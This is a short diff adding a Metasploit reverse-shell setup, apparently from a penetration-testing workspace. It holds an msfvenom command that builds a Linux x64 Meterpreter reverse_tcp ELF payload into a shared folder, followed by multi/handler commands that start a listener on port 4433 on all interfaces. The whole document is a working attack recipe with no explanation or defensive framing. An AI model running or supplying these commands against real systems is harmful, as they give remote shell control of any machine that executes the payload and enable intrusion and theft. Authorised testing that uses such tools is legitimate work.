@@ -1,0 +1,6 @@
+msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=4433 -f elf > /pentest/share/shell
+use multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set LPORT 4433
+set LHOST 0.0.0.0
+exploit -j
